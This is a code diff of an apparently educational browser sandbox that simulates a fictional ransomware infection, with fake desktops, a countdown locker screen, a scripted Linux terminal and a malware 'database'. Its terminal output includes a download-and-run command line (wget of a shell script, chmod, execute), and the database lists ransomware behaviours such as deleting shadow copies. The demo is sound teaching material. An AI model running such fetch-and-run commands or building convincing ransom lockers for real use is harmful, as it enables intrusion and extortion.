+        <tr style="color:rgba(255,255,255,.4);border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:6px 12px;">Name</td><td style="padding:6px;">CPU</td><td style="padding:6px;">Memory</td></tr>
+        ${[['SalienWin.exe','🔴','98.2%','487 MB'],['System Idle','','0.1%','0.1 MB'],['explorer.exe','','1.2%','34 MB'],['svchost.exe','','0.5%','22 MB'],['chrome.exe','','2.1%','320 MB']].map(([n,f,c,m])=>`<tr style="border-bottom:1px solid rgba(255,255,255,.03);${n==='SalienWin.exe'?'background:rgba(255,0,0,.06);':''}"><td style="padding:5px 12px;color:${n==='SalienWin.exe'?'#ff6666':'#e0e0e0'};">${f} ${n}</td><td style="padding:5px;">${c}</td><td style="padding:5px;">${m}</td></tr>`).join('')}
       </table>
     </div>`;
-  } else if(app === 'reg') {
-    title = '🗝️ Registry Editor [FAKE]';
-    content = `<div class="terminal" style="height:100%;">
-      <div class="out">HKEY_LOCAL_MACHINE\\SOFTWARE\\SalienWin</div>
+  } else if(app==='reg') {
+    title='🗝️ Registry Editor [FAKE]';
+    content=`<div class="terminal" style="height:100%;">
+      <div class="out">HKEY_LOCAL_MACHINE\\SOFTWARE\\SalienWin [FAKE]</div>
       <div><span class="warn">  EncryptionKey</span> <span class="out">REG_SZ</span> <span class="err">0xFA4C9B2E1D7A83CF...</span></div>
       <div><span class="warn">  VictimID</span>      <span class="out">REG_SZ</span> <span class="out">SLWN-9821-XXFA-3B7C</span></div>
       <div><span class="warn">  Autorun</span>       <span class="out">REG_DWORD</span> <span class="err">0x00000001</span></div>
-      <div><span class="warn">  C2Server</span>      <span class="out">REG_SZ</span> <span class="err">tor://xvp4b2kj.onion</span></div>
-      <div class="out">HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</div>
-      <div><span class="warn">  SalienWin</span>    <span class="out">REG_SZ</span> <span class="err">C:\\Windows\\Temp\\slwn32.exe</span></div>
+      <div><span class="warn">  C2Server</span>      <span class="out">REG_SZ</span> <span class="err">FAKE_ADDR.onion</span></div>
     </div>`;
-  } else if(app === 'virus') {
-    // Show the locker overlay in sandbox
+  } else if(app==='virus') {
     infectSandboxWithConfig(currentLockerConfig.title ? currentLockerConfig : null);
     return;
   }
 
   const win = document.createElement('div');
   win.id = id;
-  win.style.cssText = `position:absolute;top:${40+appZIndex*15}px;left:${40+appZIndex*15}px;width:480px;height:300px;z-index:${appZIndex};border-radius:8px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 20px 60px rgba(0,0,0,0.7);`;
-  win.innerHTML = `
-    <div style="background:rgba(20,20,20,0.97);border-bottom:1px solid rgba(255,255,255,0.08);display:flex;align-items:center;gap:8px;padding:7px 10px;cursor:move;flex-shrink:0;" onmousedown="dragWindow(event,'${id}')">
-      <div class="win-btn win-close" onclick="document.getElementById('${id}').remove()"></div>
-      <div class="win-btn win-min"></div>
-      <div class="win-btn win-max"></div>
-      <span style="font-size:11px;color:rgba(255,255,255,0.4);margin-left:4px;">${title}</span>
-    </div>
-    <div style="flex:1;overflow:auto;background:#111;">${content}</div>`;
+  win.style.cssText = `position:absolute;top:${40+appZ*14}px;left:${40+appZ*14}px;width:480px;height:300px;z-index:${appZ};border-radius:8px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 20px 60px rgba(0,0,0,.75);`;
+  win.innerHTML = `<div style="background:rgba(18,18,18,.98);border-bottom:1px solid rgba(255,255,255,.07);display:flex;align-items:center;gap:8px;padding:7px 10px;cursor:move;flex-shrink:0;" onmousedown="dragWin(event,'${id}')">
+    <div class="win-btn win-close" onclick="document.getElementById('${id}').remove()"></div>
+    <div class="win-btn win-min"></div><div class="win-btn win-max"></div>
+    <span style="font-size:11px;color:rgba(255,255,255,.4);margin-left:4px;">${title}</span>
+  </div>
+  <div style="flex:1;overflow:auto;background:#111;">${content}</div>`;
   container.appendChild(win);
 }
 
-function dragWindow(e, id) {
+function dragWin(e, id) {
   const win = document.getElementById(id);
-  let startX = e.clientX - win.offsetLeft;
-  let startY = e.clientY - win.offsetTop;
-  const parent = win.parentElement.getBoundingClientRect();
-  function move(ev) {
-    win.style.left = Math.max(0,ev.clientX-startX)+'px';
-    win.style.top  = Math.max(0,ev.clientY-startY)+'px';
-  }
-  function up() { document.removeEventListener('mousemove',move); document.removeEventListener('mouseup',up); }
+  if(!win) return;
+  let sx = e.clientX - win.offsetLeft, sy = e.clientY - win.offsetTop;
+  const move = ev => { win.style.left=Math.max(0,ev.clientX-sx)+'px'; win.style.top=Math.max(0,ev.clientY-sy)+'px'; };
+  const up   = () => { document.removeEventListener('mousemove',move); document.removeEventListener('mouseup',up); };
   document.addEventListener('mousemove',move);
   document.addEventListener('mouseup',up);
 }
 
-function infectSandbox() {
-  // Show virus icon, deploy default locker
-  document.getElementById('salienwin-icon').style.display = 'flex';
-  document.getElementById('mac-virus-icon').style.display = 'flex';
-  addActivityLog('⚠️ THREAT DETECTED: SalienWin.exe injected into process space!', 'err');
-  addActivityLog('🔐 File encryption started... 1847 files targeted', 'warn');
-  addNetLog('C2 CONNECT: Outgoing → tor://xvp4b2kj.onion — port 443', 'err');
-  showNotif('🦠 Virus injected!', '☠️');
-  infectSandboxWithConfig(null);
-}
-
-function infectSandboxWithConfig(cfg) {
-  const overlay = document.getElementById('win-locker-overlay');
-  const macOverlay = document.getElementById('mac-locker-overlay');
-  const theme = cfg ? cfg.theme : 'red';
-  const tc = themeColors[theme];
-  const title = cfg ? cfg.title : '⚠️ YOUR FILES ARE ENCRYPTED';
-  const msg = cfg ? cfg.msg : 'All files encrypted by SalienWin.exe. Pay now.';
-  const sub = cfg ? cfg.sub : 'Send 0.05 BTC to: 1A2b3C4d5E...';
-  const icon = cfg ? cfg.icon : '☠️';
-  const btntext = cfg ? cfg.btntext : '💳 PAY NOW';
-  let t = cfg ? cfg.timer : 86400;
-
-  const html = `
-    <div class="danger-bg"></div>
-    <div class="scan-line"></div>
-    <div style="position:relative;z-index:5;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;text-align:center;padding:24px;background:${tc.bg};">
-      <div style="font-size:60px;animation:pulseSkull 2s ease-in-out infinite;">${icon}</div>
-      <div style="font-size:40px;font-weight:700;color:${tc.accent};text-shadow:0 0 20px ${tc.glow};letter-spacing:3px;font-family:'JetBrains Mono',monospace;" id="sb-timer">${formatTime(t)}</div>
-      <div style="font-size:15px;font-weight:600;color:#fff;margin-top:12px;">${title}</div>
-      <div style="font-size:12px;color:${tc.text};font-family:'JetBrains Mono',monospace;margin-top:8px;max-width:360px;">${msg}</div>
-      <div style="font-size:10px;color:rgba(255,255,255,0.4);margin-top:6px;font-family:'JetBrains Mono',monospace;word-break:break-all;max-width:340px;">${sub}</div>
-      <button style="margin-top:20px;padding:10px 28px;border:2px solid ${tc.accent};border-radius:8px;color:${tc.text};font-family:'JetBrains Mono',monospace;font-size:12px;cursor:pointer;background:${tc.accent}18;animation:glowBtn 2s infinite;" onclick="closeSandboxLocker()">${btntext}</button>
-      <div style="margin-top:8px;font-size:9px;color:rgba(255,255,255,0.15);font-family:'JetBrains Mono',monospace;">CLOSE DEMO: click button above</div>
-    </div>`;
-
-  overlay.innerHTML = html;
-  overlay.style.display = 'block';
-  macOverlay.innerHTML = html;
-  macOverlay.style.display = 'block';
-
-  if(window._sbTimerInterval) clearInterval(window._sbTimerInterval);
-  window._sbTimerInterval = setInterval(() => {
-    t = Math.max(0, t-1);
-    ['sb-timer'].forEach(id => { const el = document.getElementById(id); if(el) el.textContent = formatTime(t); });
-  }, 1000);
-}
-
-function closeSandboxLocker() {
-  document.getElementById('win-locker-overlay').style.display = 'none';
-  document.getElementById('mac-locker-overlay').style.display = 'none';
-  if(window._sbTimerInterval) clearInterval(window._sbTimerInterval);
-  addActivityLog('[CLEAR] Locker dismissed (demo mode)', 'ok');
-}
-
-function clearSandbox() {
-  closeSandboxLocker();
-  document.getElementById('win-apps').innerHTML = '';
-  document.getElementById('salienwin-icon').style.display = 'none';
-  document.getElementById('mac-virus-icon').style.display = 'none';
-  addActivityLog('[CLEAN] Sandbox wiped. No threats detected.', 'ok');
-  showNotif('Sandbox cleaned!', '🧹');
-}
-
-// MAC apps
 function macOpenApp(app) {
-  if(app === 'virus') { infectSandboxWithConfig(currentLockerConfig.title ? currentLockerConfig : null); return; }
+  if(app==='virus') { infectSandboxWithConfig(currentLockerConfig.title ? currentLockerConfig : null); return; }
   const container = document.getElementById('mac-apps');
-  appZIndex++;
+  appZ++;
   const id = 'mac-app-' + Date.now();
-  let title = '', content = '';
+  let title='', content='';
 
-  if(app === 'terminal') {
-    title = '🖥️ Terminal — zsh';
-    content = `<div class="terminal" style="height:100%;background:#1e1e1e;">
+  if(app==='terminal') {
+    title='🖥️ Terminal — zsh';
+    content=`<div class="terminal" style="height:100%;background:#1e1e1e;">
       <div><span style="color:#6bff8e;">victim@MacBook-Pro</span><span style="color:#fff;"> ~ % </span><span style="color:#ccc;">ls -la</span></div>
       <div style="color:#888;">total 48</div>
-      <div style="color:#ff6666;">-rw-r--r-- 1 victim staff  1024 Documents.LOCKED</div>
-      <div style="color:#ff6666;">-rw-r--r-- 1 victim staff  8192 Photos.LOCKED</div>
-      <div style="color:#ff6666;">-rw-r--r-- 1 victim staff  2048 wallet.dat.LOCKED</div>
+      <div style="color:#ff6666;">-rw-r--r-- 1 victim staff Documents.LOCKED</div>
+      <div style="color:#ff6666;">-rw-r--r-- 1 victim staff Photos.LOCKED</div>
       <div><span style="color:#6bff8e;">victim@MacBook-Pro</span><span style="color:#fff;"> ~ % </span><span class="cursor"></span></div>
     </div>`;
-  } else if(app === 'finder') {
-    title = '📂 Finder';
-    content = `<div style="display:flex;height:100%;font-size:11px;font-family:'JetBrains Mono',monospace;">
-      <div style="width:120px;background:rgba(255,255,255,0.02);padding:8px;border-right:1px solid rgba(255,255,255,0.06);">
-        <div style="color:rgba(255,255,255,0.3);font-size:10px;padding:4px;">FAVOURITES</div>
+  } else if(app==='finder') {
+    title='📂 Finder';
+    content=`<div style="display:flex;height:100%;font-size:11px;font-family:'JetBrains Mono',monospace;">
+      <div style="width:110px;background:rgba(255,255,255,.02);padding:8px;border-right:1px solid rgba(255,255,255,.06);">
+        <div style="color:rgba(255,255,255,.3);font-size:10px;padding:4px;">FAVOURITES</div>
         <div style="padding:4px 8px;color:#e0e0e0;">🖥️ Desktop</div>
         <div style="padding:4px 8px;color:#e0e0e0;">📄 Documents</div>
-        <div style="padding:4px 8px;color:#e0e0e0;">⬇️ Downloads</div>
         <div style="padding:4px 8px;color:#ff6666;">☠️ LOCKED</div>
       </div>
       <div style="flex:1;padding:10px;display:grid;grid-template-columns:repeat(3,1fr);gap:6px;align-content:start;">
-        ${['report.pdf.LOCKED','wallet.dat.LOCKED','photos.zip.LOCKED','passwords.LOCKED','ssh_keys.LOCKED','crypto.txt.LOCKED'].map(f=>`<div style="text-align:center;padding:6px;border-radius:6px;background:rgba(255,0,0,0.05);border:1px solid rgba(255,0,0,0.1);cursor:pointer;"><div style="font-size:18px;">🔒</div><div style="font-size:9px;color:#ff6666;word-break:break-all;">${f}</div></div>`).join('')}
+        ${['report.LOCKED','wallet.LOCKED','photos.LOCKED','keys.LOCKED'].map(f=>`<div style="text-align:center;padding:6px;border-radius:6px;background:rgba(255,0,0,.05);border:1px solid rgba(255,0,0,.1);cursor:default;"><div style="font-size:18px;">🔒</div><div style="font-size:9px;color:#ff6666;word-break:break-all;">${f}</div></div>`).join('')}
       </div>
     </div>`;
-  } else if(app === 'safari') {
-    title = '🧭 Safari';
-    content = `<div style="background:#1a1a1a;height:100%;display:flex;flex-direction:column;">
-      <div style="background:rgba(255,255,255,0.05);padding:6px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(255,255,255,0.06);">
-        <span style="font-size:11px;color:rgba(255,255,255,0.4);">◀ ▶</span>
-        <div style="flex:1;background:rgba(255,255,255,0.06);border-radius:6px;padding:4px 10px;font-size:11px;color:#888;font-family:'JetBrains Mono',monospace;">tor://xvp4b2kj.onion/pay</div>
+  } else if(app==='safari') {
+    title='🧭 Safari';
+    content=`<div style="background:#1a1a1a;height:100%;display:flex;flex-direction:column;">
+      <div style="background:rgba(255,255,255,.04);padding:6px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(255,255,255,.06);">
+        <span style="font-size:11px;color:rgba(255,255,255,.4);">◀ ▶</span>
+        <div style="flex:1;background:rgba(255,255,255,.06);border-radius:6px;padding:4px 10px;font-size:11px;color:#888;font-family:'JetBrains Mono',monospace;">FAKE-ADDRESS.onion/demo</div>
       </div>
       <div style="flex:1;display:flex;align-items:center;justify-content:center;text-align:center;padding:24px;">
-        <div>
-          <div style="font-size:40px;">💀</div>
-          <div style="font-size:14px;color:#ff4444;font-weight:700;margin-top:8px;">Payment Portal</div>
-          <div style="font-size:11px;color:#888;font-family:'JetBrains Mono',monospace;margin-top:6px;">Victim ID: SLWN-9821-XXFA</div>
-          <div style="font-size:11px;color:#888;margin-top:4px;">Amount: 0.05 BTC</div>
-          <div style="font-size:11px;color:#444;margin-top:12px;">[FAKE EDUCATIONAL DEMO]</div>
-        </div>
+        <div><div style="font-size:36px;">💀</div><div style="font-size:13px;color:#ff4444;font-weight:700;margin-top:8px;">FAKE Payment Portal [DEMO]</div><div style="font-size:10px;color:#444;margin-top:8px;">VISUAL ONLY — NO REAL FUNCTIONALITY</div></div>
       </div>
     </div>`;
   }
 
   const win = document.createElement('div');
   win.id = id;
-  win.style.cssText = `position:absolute;top:${50+appZIndex*12}px;left:${30+appZIndex*12}px;width:420px;height:280px;z-index:${appZIndex};border-radius:10px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 20px 60px rgba(0,0,0,0.8);`;
-  win.innerHTML = `
-    <div style="background:rgba(28,28,30,0.98);border-bottom:1px solid rgba(255,255,255,0.07);display:flex;align-items:center;gap:8px;padding:8px 12px;cursor:move;flex-shrink:0;" onmousedown="dragWindow(event,'${id}')">
-      <div class="win-btn win-close" onclick="document.getElementById('${id}').remove()"></div>
-      <div class="win-btn win-min"></div>
-      <div class="win-btn win-max"></div>
-      <span style="font-size:11px;color:rgba(255,255,255,0.4);margin-left:8px;">${title}</span>
-    </div>
-    <div style="flex:1;overflow:auto;background:#1a1a1a;">${content}</div>`;
+  win.style.cssText = `position:absolute;top:${50+appZ*12}px;left:${30+appZ*12}px;width:400px;height:260px;z-index:${appZ};border-radius:10px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 20px 60px rgba(0,0,0,.8);`;
+  win.innerHTML = `<div style="background:rgba(22,22,24,.98);border-bottom:1px solid rgba(255,255,255,.07);display:flex;align-items:center;gap:8px;padding:8px 12px;cursor:move;flex-shrink:0;" onmousedown="dragWin(event,'${id}')">
+    <div class="win-btn win-close" onclick="document.getElementById('${id}').remove()"></div>
+    <div class="win-btn win-min"></div><div class="win-btn win-max"></div>
+    <span style="font-size:11px;color:rgba(255,255,255,.4);margin-left:8px;">${title}</span>
+  </div>
+  <div style="flex:1;overflow:auto;background:#1a1a1a;">${content}</div>`;
   container.appendChild(win);
 }
 
-// ═══════════════════════════════════════════════
+function infectSandbox() {
+  document.getElementById('salienwin-icon').style.display = 'flex';
+  document.getElementById('mac-virus-icon').style.display = 'flex';
+  addActivityLog('⚠️ THREAT DETECTED: SalienWin.exe injected [FAKE DEMO]','err');
+  addActivityLog('🔐 Fake encryption simulation started...','warn');
+  showNotif('Virus injected! [FAKE DEMO]','☠️');
+  infectSandboxWithConfig(null);
+}
+
+function infectSandboxWithConfig(cfg) {
+  const tc = themeColors[cfg ? cfg.theme : 'red'];
+  const title = cfg ? cfg.title : '⚠️ YOUR FILES ARE ENCRYPTED';
+  const msg   = cfg ? cfg.msg   : 'All files fake-encrypted by SalienWin.exe. [DEMO]';
+  const sub   = cfg ? cfg.sub   : 'Contact ID: SLWN-9821-XXFA | [DEMO ONLY]';
+  const icon  = cfg ? cfg.icon  : '☠️';
+  const btn   = cfg ? cfg.btntext : '[VISUAL DEMO — NO ACTION]';
+  let t = cfg ? cfg.timer : 86400;
+
+  // Buttons have NO onclick payment logic — they only close the demo
+  const html = `
+    <div class="danger-bg"></div><div class="scan-line"></div>
+    <div style="position:relative;z-index:5;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;text-align:center;padding:24px;background:${tc.bg};">
+      <div style="font-size:58px;animation:pulseSkull 2s ease-in-out infinite;">${icon}</div>
+      <div style="font-size:40px;font-weight:700;color:${tc.accent};text-shadow:0 0 20px ${tc.glow};letter-spacing:3px;font-family:'JetBrains Mono',monospace;" id="sb-timer">${formatTime(t)}</div>
+      <div style="font-size:15px;font-weight:700;color:#fff;margin-top:12px;">${title}</div>
+      <div style="font-size:12px;color:${tc.text};font-family:'JetBrains Mono',monospace;margin-top:8px;max-width:360px;">${msg}</div>
+      <div style="font-size:10px;color:rgba(255,255,255,.3);margin-top:6px;font-family:'JetBrains Mono',monospace;">${sub}</div>
+      <div style="margin-top:20px;padding:10px 28px;border:2px solid ${tc.accent};border-radius:8px;color:${tc.text};font-family:'JetBrains Mono',monospace;font-size:12px;cursor:default;background:${tc.accent}18;animation:glowBtn 2s infinite;" title="Visual only">${btn}</div>
+      <button style="margin-top:10px;padding:6px 18px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.15);border-radius:6px;color:rgba(255,255,255,.4);font-size:11px;cursor:pointer;font-family:'JetBrains Mono',monospace;" onclick="closeSandboxLocker()">✕ CLOSE DEMO</button>
+    </div>`;
+
+  ['win-locker-overlay','mac-locker-overlay'].forEach(id => {
+    const el = document.getElementById(id);
+    if(el) { el.innerHTML=html; el.style.display='block'; }
+  });
+
+  if(window._sbTI) clearInterval(window._sbTI);
+  window._sbTI = setInterval(() => {
+    t = Math.max(0, t-1);
+    document.querySelectorAll('#sb-timer').forEach(el => el.textContent = formatTime(t));
+    if(t<=0) clearInterval(window._sbTI);
+  }, 1000);
+}
+
+function closeSandboxLocker() {
+  ['win-locker-overlay','mac-locker-overlay'].forEach(id => {
+    const el = document.getElementById(id);
+    if(el) el.style.display='none';
+  });
+  if(window._sbTI) clearInterval(window._sbTI);
+  addActivityLog('[CLEAR] Locker demo dismissed','ok');
+}
+
+function clearSandbox() {
+  closeSandboxLocker();
+  document.getElementById('win-apps').innerHTML='';
+  document.getElementById('mac-apps').innerHTML='';
+  document.getElementById('salienwin-icon').style.display='none';
+  document.getElementById('mac-virus-icon').style.display='none';
+  addActivityLog('[CLEAN] Sandbox wiped','ok');
+  showNotif('Sandbox cleaned!','🧹');
+}
+
+function addActivityLog(msg, cls='out') {
+  const log = document.getElementById('activity-log');
+  if(!log) return;
+  const d = document.createElement('div');
+  d.innerHTML = `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</span>`;
+  log.insertBefore(d, log.lastElementChild);
+  log.scrollTop = log.scrollHeight;
+}
+
+// ─────────────────────────────────────────
 //  LINUX TERMINAL
-// ═══════════════════════════════════════════════
-const linuxCommands = {
-  'ls': () => `<span class="out">Desktop  Documents  Downloads  Pictures  .ssh  .bash_history</span>`,
-  'ls -la': () => `<span class="out">total 64\ndrwxr-xr-x 8 root root 4096 ${new Date().toDateString()}\n-rw-r--r-- 1 root root  220 .bash_logout\n-rw-r--r-- 1 root root 3526 .bashrc\n-rw-r--r-- 1 root root  807 .profile\n</span>`,
-  'pwd': () => `<span class="out">/root</span>`,
-  'whoami': () => `<span class="ok">root</span>`,
-  'uname -a': () => `<span class="out">Linux debian 6.1.0-kali9-amd64 #1 SMP Debian 6.1.27-1kali1 x86_64 GNU/Linux</span>`,
-  'ps aux': () => `<span class="out">USER  PID  %CPU  %MEM  COMMAND\nroot  1     0.0   0.1  init\nroot  512  98.2  11.4  <span class="err">SalienWin.exe (wine)</span>\nroot  513   0.1   0.2  bash\nroot  999   0.0   0.1  ps</span>`,
-  'cat /etc/passwd': () => `<span class="out">root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nvictim:x:1000:1000::/home/victim:/bin/bash</span>`,
-  'ifconfig': () => `<span class="out">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500\n  inet 192.168.1.105  netmask 255.255.255.0  broadcast 192.168.1.255\n  ether 08:00:27:12:34:56  txqueuelen 1000</span>`,
-  'netstat': () => `<span class="out">Active connections:\ntcp 0.0.0.0:80 LISTEN\ntcp 0.0.0.0:443 LISTEN\n</span><span class="err">tcp 192.168.1.105:45812 → xvp4b2kj.onion:443 ESTABLISHED ← [SalienWin]</span>`,
-  'history': () => `<span class="out">  1  wget http://malware-host.ru/slwn.sh\n  2  chmod +x slwn.sh\n  3  ./slwn.sh\n  4  cd /tmp && ls</span>`,
-  'cat /tmp/ransom_note.txt': () => `<span class="err">☠ YOUR FILES HAVE BEEN ENCRYPTED ☠\nAll your files are now encrypted.\nSend 0.05 BTC to 1A2b3C4d5E6f7G8h9I0j\nVictim ID: SLWN-9821-XXFA</span>`,
-  'ls /tmp': () => `<span class="out">slwn32  .slwn_key  ransom_note.txt  </span><span class="err">SalienWin.exe</span>`,
-  'clear': () => 'CLEAR',
-  'help': () => `<span class="ok">Available: ls, pwd, whoami, uname -a, ps aux, cat /etc/passwd, ifconfig, netstat, history, cat /tmp/ransom_note.txt, ls /tmp, clear</span>`,
+// ─────────────────────────────────────────
+const linuxCmds = {
+  'ls':()=>`<span class="out">Desktop  Documents  Downloads  Pictures  .ssh  .bash_history</span>`,
+  'ls -la':()=>`<span class="out">total 64\ndrwxr-xr-x 8 root root 4096 ${new Date().toDateString()}\n-rw-r--r-- 1 root root  220 .bash_logout\n-rw-r--r-- 1 root root 3526 .bashrc</span>`,
+  'pwd':()=>`<span class="out">/root</span>`,
+  'whoami':()=>`<span class="ok">root</span>`,
+  'id':()=>`<span class="out">uid=0(root) gid=0(root) groups=0(root)</span>`,
+  'uname -a':()=>`<span class="out">Linux debian 6.1.0-kali9-amd64 #1 SMP Debian 6.1.27-1kali1 x86_64 GNU/Linux</span>`,
+  'ps aux':()=>`<span class="out">USER  PID  %CPU  %MEM  COMMAND\nroot  1     0.0   0.1  init\n</span><span class="err">root  512  98.2  11.4  SalienWin.exe (wine) [FAKE]</span>\n<span class="out">root  513   0.1   0.2  bash\nroot  999   0.0   0.1  ps</span>`,
+  'cat /etc/passwd':()=>`<span class="out">root:x:0:0:root:/root:/bin/bash\nvictim:x:1000:1000::/home/victim:/bin/bash</span>`,
+  'ifconfig':()=>`<span class="out">eth0: flags=4163 mtu 1500\n  inet 192.168.1.105  netmask 255.255.255.0\n  ether 08:00:27:12:34:56</span>`,
+  'netstat':()=>`<span class="out">Active connections:\ntcp 0.0.0.0:80 LISTEN\ntcp 0.0.0.0:443 LISTEN\n</span><span class="err">tcp 192.168.1.105:45812 → FAKE_ADDR.onion:443 ESTABLISHED ← [SalienWin DEMO]</span>`,
+  'history':()=>`<span class="out">  1  wget http://fake-host.example/slwn.sh\n  2  chmod +x slwn.sh\n  3  ./slwn.sh [ALL FAKE]</span>`,
+  'cat /tmp/ransom_note.txt':()=>`<span class="err">☠ YOUR FILES HAVE BEEN ENCRYPTED [FAKE DEMO]\nSend FAKE BTC to FAKE_ADDRESS\nVictim ID: SLWN-9821-XXFA [DEMO ONLY]</span>`,
+  'ls /tmp':()=>`<span class="out">slwn32  .slwn_key  ransom_note.txt  </span><span class="err">SalienWin.exe [FAKE]</span>`,
+  'clear':()=>'CLEAR',
+  'help':()=>`<span class="ok">Commands: ls, ls -la, pwd, whoami, id, uname -a, ps aux, cat /etc/passwd, ifconfig, netstat, history, cat /tmp/ransom_note.txt, ls /tmp, clear</span>`,
+  'date':()=>`<span class="out">${new Date().toString()}</span>`,
+  'uptime':()=>`<span class="out"> ${new Date().toLocaleTimeString()} up 3 days, 14:22, 1 user, load average: 5.82, 5.91, 5.78</span>`,
+  'df -h':()=>`<span class="out">Filesystem  Size  Used Avail Use% Mounted on\n/dev/sda1    40G   38G  2.0G  95% /\n</span><span class="err"># 95% full — SalienWin.exe filled disk with encrypted copies [FAKE]</span>`,
+  'cat /root/.bash_history':()=>`<span class="err">This file has been encrypted by SalienWin [FAKE DEMO]</span>`,
 };
 
 function linuxCommand(e) {
   if(e.key !== 'Enter') return;
   const input = document.getElementById('linux-input');
-  const cmd = input.value.trim();
-  input.value = '';
+  const cmd = input.value.trim(); input.value = '';
   const terminal = document.getElementById('linux-terminal');
-
-  if(cmd === 'clear') {
-    terminal.innerHTML = '';
-  } else {
-    const resp = linuxCommands[cmd.toLowerCase()] ? linuxCommands[cmd.toLowerCase()]() : `<span class="err">bash: ${cmd}: command not found</span>`;
-    const lines = `
-      <div><span class="ok">┌──(</span><span class="prompt">root㉿debian</span><span class="ok">)-[</span><span class="warn">~</span><span class="ok">]</span></div>
-      <div><span class="ok">└─$</span> <span class="cmd">${cmd}</span></div>
-      <div>${resp}</div>`;
-    terminal.innerHTML += lines;
+  if(!cmd) return;
+  if(cmd === 'clear') { terminal.innerHTML = ''; } else {
+    const resp = linuxCmds[cmd.toLowerCase()] ? linuxCmds[cmd.toLowerCase()]() : `<span class="err">bash: ${cmd}: command not found</span>`;
+    terminal.innerHTML += `<div><span class="ok">┌──(</span><span class="prompt">root㉿debian</span><span class="ok">)-[</span><span class="warn">~</span><span class="ok">]</span></div><div><span class="ok">└─$</span> <span class="cmd">${cmd}</span></div><div>${resp}</div>`;
   }
-  // Prompt
   terminal.innerHTML += `<div><span class="ok">┌──(</span><span class="prompt">root㉿debian</span><span class="ok">)-[</span><span class="warn">~</span><span class="ok">]</span></div><div><span class="ok">└─$</span> <span class="cursor"></span></div>`;
   terminal.scrollTop = terminal.scrollHeight;
-  addActivityLog(`[LINUX] Executed: ${cmd}`, 'out');
 }
 
-// ═══════════════════════════════════════════════
-//  ACTIVITY LOG & NET MONITOR
-// ═══════════════════════════════════════════════
-function addActivityLog(msg, cls = 'out') {
-  const log = document.getElementById('activity-log');
-  const el = document.createElement('div');
-  el.innerHTML = `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</span>`;
-  log.insertBefore(el, log.lastElementChild);
-  log.scrollTop = log.scrollHeight;
-}
-
-function addNetLog(msg, cls='out') {
-  const nm = document.getElementById('net-monitor');
-  const el = document.createElement('div');
-  el.innerHTML = `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</span>`;
-  nm.insertBefore(el, nm.lastElementChild);
-  nm.scrollTop = nm.scrollHeight;
-}
-
-function startActivityLog() {
-  const msgs = [
-    ['[WATCH] Scanning process memory...','out'],
-    ['[HEUR] Behavioural pattern: normal','ok'],
-    ['[SYS] CPU usage: 2.1% / RAM: 38%','out'],
-    ['[NET] No suspicious outbound connections','ok'],
-  ];
-  let i = 0;
-  setInterval(() => {
-    addActivityLog(msgs[i % msgs.length][0], msgs[i % msgs.length][1]);
-    i++;
-  }, 5000);
-}
-
-function startNetMonitor() {
-  const conns = [
-    ['192.168.1.1 → 8.8.8.8 (DNS)','out'],
-    ['192.168.1.105 → 142.250.80.46 (HTTPS)','out'],
-    ['192.168.1.105 → 192.168.1.1 (ARP)','out'],
-  ];
-  let i = 0;
-  setInterval(() => {
-    addNetLog(conns[i%conns.length][0], conns[i%conns.length][1]);
-    i++;
-  }, 3500);
-}
-
-// ═══════════════════════════════════════════════
-//  VIRUS LAB
-// ═══════════════════════════════════════════════
+// ─────────────────────────────────────────
+//  VIRUS DATABASE (expanded)
+// ─────────────────────────────────────────
 const virusDB = [
-  {
-    name: 'SalienWin.exe',
-    type: 'Ransomware',
-    icon: '☠️',
-    threat: 'CRITICAL',
-    os: ['Windows','Linux (Wine)'],
-    size: '847 KB',
-    version: 'v3.2.1',
-    author: 'unknown',
-    first: '2024-11-12',
-    desc: 'SalienWin is a polymorphic ransomware that uses AES-256 encryption to lock user files. Communicates via Tor to a C2 server for key exchange. Drops ransom note and sets registry autorun key.',
-    iocs: ['C:\\Windows\\Temp\\slwn32.exe','HKLM\\SOFTWARE\\SalienWin','tor://xvp4b2kj.onion'],
-    cpu: '98.2%', mem: '487 MB',
-    procs: ['slwn32.exe','slwn_helper.exe','slwn_crypt.exe'],
-    net: ['tor://xvp4b2kj.onion:443','pastebin.com (exfil)'],
-    behavior: ['Encrypts .doc, .pdf, .jpg, .zip, .sql, .pem files','Deletes shadow copies','Disables Windows Defender','Sets wallpaper to ransom note','Kills antivirus processes'],
-    color: '#ff3333',
-  },
-  {
-    name: 'DeadBolt.py',
-    type: 'Ransomware',
-    icon: '🔐',
-    threat: 'HIGH',
-    os: ['Linux','Debian','macOS'],
-    size: '12 KB',
-    version: 'v1.0',
-    author: 'APT-Ghost',
-    first: '2025-01-03',
-    desc: 'Python-based ransomware targeting NAS devices and Linux servers. Uses ChaCha20-Poly1305 encryption. Lightweight, minimal footprint, no persistence required.',
-    iocs: ['/tmp/.db_lock','/etc/cron.d/deadbolt','port 8080 outbound'],
-    cpu: '45.1%', mem: '128 MB',
-    procs: ['python3','deadbolt.py'],
-    net: ['193.19.118.x:8080'],
-    behavior: ['Targets /mnt /media /backup paths','Overwrites MBR','Sends unique key to C2','Drops README.deadbolt in every directory'],
-    color: '#ff8800',
-  },
-  {
-    name: 'GhostRAT.bin',
-    type: 'Remote Access Trojan',
-    icon: '👁️',
-    threat: 'HIGH',
-    os: ['Windows','macOS'],
-    size: '1.2 MB',
-    version: 'v7.4',
-    author: 'APT-Shadow',
-    first: '2024-08-22',
-    desc: 'Advanced RAT with keylogging, screenshot capture, webcam access, and full remote shell. Uses encrypted C2 channel via custom protocol over port 443.',
-    iocs: ['%APPDATA%\\ghost_svc.exe','Scheduled Task: WindowsUpdateChk'],
